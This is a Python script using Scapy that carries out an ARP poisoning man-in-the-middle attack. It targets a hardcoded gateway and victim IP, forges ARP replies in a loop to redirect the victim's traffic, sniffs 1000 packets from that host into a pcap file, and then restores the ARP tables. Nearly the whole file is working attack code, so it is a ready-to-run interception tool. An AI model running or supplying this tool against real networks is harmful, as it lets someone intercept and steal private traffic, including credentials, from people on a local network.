from scapy.all import *
import os
import signal
import sys
import threading
import time

#ARP Poison parameters
gateway_ip = "198.13.13.1"
target_ip = "198.13.0.14"
packet_count = 1000

#Given an IP, get the MAC address. Broadcast an ARP Request for an IP Address, so that we recieve
#an ARP reply with the MAC Address
def get_mac_address(ip):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

#Restore the network by reversing the ARP poison attack. Broadcast an ARP Reply with
#correct MAC and IP Address
def heal_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)

#Keep sending false ARP replies to put our machine in the middle to intercept packets
#This will use our interface MAC address as the hwsrc for the ARP reply
def poison_network(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-\ to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(3)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        heal_network(gateway_ip, gateway_mac, target_ip, target_mac)
	os._exit(0)

#Start the script
print("[*] Starting script: arp.py")

gateway_mac = get_mac_address(gateway_ip)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..")
    sys.exit(0)
else:
    print("[*] Gateway MAC address: " + gateway_mac)

target_mac = get_mac_address(target_ip)
if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting..")
    sys.exit(0)
else:
    print("[*] Target MAC address: " + target_mac)

#ARP poison thread
poison_thread = threading.Thread(target=poison_network, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

#Sniff traffic and write to file. Capture is filtered on target machine
try:
    sniff_filter = "ip host " + target_ip
    print("[*] Starting network capture. Packet Count: 1000. Filter: " + sniff_filter)
    #Sniffing the packets
    packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
    #Writing to pcap file
    wrpcap(target_ip + "_capture.pcap", packets)
    print("[*] Stopping network capture..Restoring network")
    #Undo the damage
    heal_network(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    print("[*] Stopping network capture..Restoring network")
    heal_network(gateway_ip, gateway_mac, target_ip, target_mac)
    exit()
